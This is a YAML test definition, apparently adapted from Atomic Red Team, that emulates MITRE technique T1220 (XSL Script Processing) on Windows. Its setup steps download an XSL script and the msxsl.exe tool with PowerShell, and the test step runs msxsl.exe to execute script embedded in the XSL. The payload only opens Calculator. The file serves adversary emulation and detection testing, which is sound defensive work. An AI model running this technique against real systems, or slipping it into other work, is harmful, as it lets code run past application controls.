api_version: "2.0"
name: MSXSL Bypass using local files
description: "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n"
args:
    - name: xmlfile
      type: path
      default: PathToAtomicsFolder\T1220\src\msxslxmlfile.xml
    - name: xslfile
      type: path
      default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
    - name: msxsl_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe
uuid: ca23bfb2-023f-49c5-8802-e66997de462d
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1220: XSL Script Processing'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        XML file must exist on disk at specified location (#{xmlfile})
      inline: |
        if (Test-Path "#{xmlfile}") {exit 0} else {{New-Item -Type Directory (split-path "#{xmlfile}") -ErrorAction Ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
        }}
      executor: powershell
    - name: |
        XSL file must exist on disk at specified location (#{xslfile})
      inline: |
        if (Test-Path "#{xslfile}") {exit 0} else {{New-Item -Type Directory (split-path "#{xslfile}") -ErrorAction Ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
        }}
      executor: powershell
    - name: |
        msxsl.exe must exist on disk at specified location (#{msxsl_exe})
      inline: |
        if (Test-Path "#{msxsl_exe}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
        }}
      executor: powershell
    - name: msxsl-bypass-using-local-files
      inline: |
        "{{.Args.msxsl_exe}}" "{{.Args.xmlfile}}" "{{.Args.xslfile}}"
      executor: command_prompt
      cleanup:
        inline: |
            del "{{.Args.msxsl_exe}}" >nul 2>&1
        executor: command_prompt
